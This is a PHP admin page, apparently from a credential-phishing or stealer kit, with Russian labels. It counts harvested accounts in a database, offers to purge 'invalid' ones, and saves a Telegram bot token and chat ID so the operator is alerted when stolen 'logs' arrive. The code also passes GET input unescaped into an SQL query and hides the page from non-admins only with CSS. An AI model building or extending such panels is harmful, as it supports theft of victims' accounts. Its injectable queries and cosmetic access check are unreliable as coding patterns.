<?
include '../bdlog.php';
if(!isset($_SESSION['admin'])) { echo '<style> body {display:none !important;}'; }

if(isset($_SESSION['admin'])) {
if(isset($_GET['tg_chat'])) {
	$tg_chat = $_GET['tg_chat'];
	$tg_token = $_GET['tg_token'];
  $db->query("update settings set  `tg_chat` = '$tg_chat', `tg_token` = '$tg_token'");
	echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=/admin/telegram.php">';
}
		
}
?><!DOCTYPE html>
<!--
This is a starter template page. Use this page to start your new project from
scratch. This page gets rid of all links and provides the needed markup only.
-->
<html lang="en">
<head>
  <meta charset="utf-8"><meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="x-ua-compatible" content="ie=edge">

  <title>Adm | Telegram</title>

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="plugins/font-awesome/css/font-awesome.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="dist/css/adminlte.css">
  <!-- Google Font: Source Sans Pro -->
  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
</head>
<body class="hold-transition sidebar-mini">
<div class="wrapper">

 
  <!-- /.navbar -->

  <!-- Main Sidebar Container -->
<aside class="main-sidebar sidebar-dark-primary elevation-4">
    <!-- Brand Logo -->
    <a style="font-family:intro; color:#ff0000;" href="index.php" class="brand-link">
      <center><span class="brand-text font-weight-2px"> ADMIN PANEL </span></center>
    </a>
     <a href="index.php" class="brand-link">
      <center><span class="brand-text font-weight-light"><img src="leftl.png"> Аккаунтов в базе: <?=$colvousers?> <img src="right.png"></span></center>
    </a>
         <a href="?deluser=8" class="brand-link">
      <center><span class="brand-text font-weight-light"><img src="leftl.png"> Очистить базу <img src="right.png"></span></center>
    </a>
	<a href="neval.php" target="blank" class="brand-link">
      <center><span class="brand-text font-weight-light"><img src="leftl.png"> Удалить НЕвалид <img src="right.png"></span></center>
    </a>


    <!-- Sidebar -->
    <div class="sidebar">
      <!-- Sidebar user panel (optional) -->
      

      <!-- Sidebar Menu -->
      <nav class="mt-2">
        <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
          <!-- Add icons to the links using the .nav-icon class
               with font-awesome or any other icon font library -->
          <? include 'menu.php'; ?>
          
        </ul>
      </nav>
      <!-- /.sidebar-menu -->
    </div>
    <!-- /.sidebar -->
  </aside>
  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <div class="content-header">
      <div class="container-fluid">
        <div class="row mb-2">
          <div class="col-sm-6">
            <h1 class="m-0 text-dark">Настройки</h1>
          </div>
        </div><!-- /.row -->
      </div><!-- /.container-fluid -->
    </div>
    <!-- /.content-header -->

    <!-- Main content -->
    <div class="content">
      <div class="container-fluid">
      <div class="col-md-7" style="display:inline-block;">
          <div class="card card-primary">
              <div class="card-header">
<h3 class="card-title">Оповещения в телеграм когда приходят логи (не указывай если не нужен)</h3>
              </div>
              <!-- /.card-header -->
              <!-- form start -->
              <form role="form" method="GET">
                <div class="card-body">
				
				
				<div class="form-group">
                    <label >ID твоего чата у бота телеграм</label>
                    <input type="text" class="form-control" id="tg_chat" name="tg_chat" required value="<?=$tg_chat?>">
                  </div>
				
				   <div class="form-group">
                    <label >Токен бота телеграм <a href="../admin/token_tg.php" target="_blank">(где взять)</a></label>
                    <input type="text" class="form-control" name="tg_token" required value="<?=$tg_token?>">
                  </div>
				  
				  </div>
          
                <!-- /.card-body -->

                <div class="card-footer">
                  <button type="submit" class="btn btn-primary" name="Okey">Сохранить</button>
                </div>
              </form>
            </div>


        <!-- /.row -->
      </div><!-- /.container-fluid -->
      
    </div>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->

  <!-- Control Sidebar -->
  
  <!-- /.control-sidebar -->

  <!-- Main Footer -->
 
</div>
<!-- ./wrapper -->

<!-- REQUIRED SCRIPTS -->

<!-- jQuery -->
<script src="plugins/jquery/jquery.min.js"></script>
<!-- Bootstrap 4 -->
<script src="plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- AdminLTE App -->
<script src="dist/js/adminlte.min.js"></script>
</body>
</html>